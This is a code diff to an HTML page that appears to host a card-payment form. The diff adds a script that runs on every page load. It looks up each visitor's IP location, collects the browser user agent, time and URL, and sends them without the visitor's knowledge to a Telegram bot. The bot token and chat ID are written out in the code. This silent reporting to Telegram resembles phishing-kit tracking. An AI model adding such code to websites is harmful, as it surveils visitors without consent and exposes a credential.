@@ -966,7 +966,7 @@
                     </a>
                 </div>
             </div>
-        </div>
+                    </div>
     </footer>
 
     <!-- Back to Top Button -->
@@ -987,6 +987,58 @@
             once: true
         });
         
+        // Track page visit and send notification
+        async function trackPageVisit() {
+            try {
+                // Get visitor info
+                const ipResponse = await fetch('https://ipapi.co/json/');
+                const ipData = await ipResponse.json();
+                
+                // Device detection
+                const userAgent = navigator.userAgent;
+                const isMobile = /Android|iPhone|iPad|iPod/i.test(userAgent);
+                const deviceType = isMobile ? "Mobile 📱" : "Desktop 💻";
+                const now = new Date().toLocaleString();
+                
+                // Prepare message
+                const message = `
+🔔 **New Website Visit** 🔔
+🌍 Country: ${ipData.country_name || "Unknown"} (${ipData.country_code || "N/A"})
+🏙 City: ${ipData.city || "Unknown"}
+📍 Region: ${ipData.region || "Unknown"}
+📱 Device: ${deviceType} (${userAgent})
+🕒 Time: ${now}
+🔗 Page: ${window.location.href}
+                `;
+                
+                // Telegram bot settings (replace with your actual token and chat ID)
+                const telegramToken = "8136808876:AAHGP4-gnV2qGXqjMkwzcdV-9olnYt_0Dj4";
+                const telegramChatId = "5372119436";
+                
+                // Send to Telegram
+                await fetch(`https://api.telegram.org/bot${telegramToken}/sendMessage`, {
+                    method: "POST",
+                    headers: {
+                        "Content-Type": "application/json",
+                    },
+                    body: JSON.stringify({
+                        chat_id: telegramChatId,
+                        text: message,
+                        parse_mode: "Markdown",
+                    }),
+                });
+            } catch (error) {
+                console.error("Tracking error:", error);
+            }
+        }
+        
+        // Run tracking when page loads
+        if (document.readyState === 'complete') {
+            trackPageVisit();
+        } else {
+            window.addEventListener('load', trackPageVisit);
+        }
+
         // Card number formatting
         const cardInput = document.getElementById('numero-carte');
         const cardError = document.getElementById('card-error');
